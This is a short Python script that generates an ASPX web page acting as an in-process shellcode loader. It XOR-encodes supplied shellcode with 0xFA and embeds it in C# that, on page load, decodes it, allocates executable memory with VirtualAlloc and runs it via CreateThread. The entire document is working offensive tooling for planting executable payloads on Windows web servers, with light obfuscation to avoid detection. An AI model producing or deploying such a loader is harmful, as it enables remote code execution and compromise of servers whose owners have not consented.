#!/usr/bin/env python3
"""Build an ASPX in-process shellcode loader with XOR-0xFA encoded payload.

Usage:
    python3 /tmp/c6_make_loader.py <shellcode.bin> <out.aspx>

Reads raw shellcode bytes, XORs each with 0xFA, embeds as C# byte array
in an ASPX page that VirtualAllocs RWX memory, copies, and CreateThreads.
"""
import sys

if len(sys.argv) != 3:
    print('usage: make_loader.py <shellcode.bin> <out.aspx>')
    sys.exit(1)

sc = open(sys.argv[1], 'rb').read()
enc = ','.join(f'0x{b ^ 0xFA:02x}' for b in sc)

template = '''<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    protected void Page_Load(object sender, EventArgs e) {
        byte[] buf = new byte[] { __BYTES__ };
        for (int i = 0; i < buf.Length; i++) buf[i] ^= 0xFA;

        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
        Marshal.Copy(buf, 0, mem, buf.Length);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
</script>
'''

open(sys.argv[2], 'w').write(template.replace('__BYTES__', enc))
print(f'OK: {len(sc)} bytes encoded → {sys.argv[2]}')
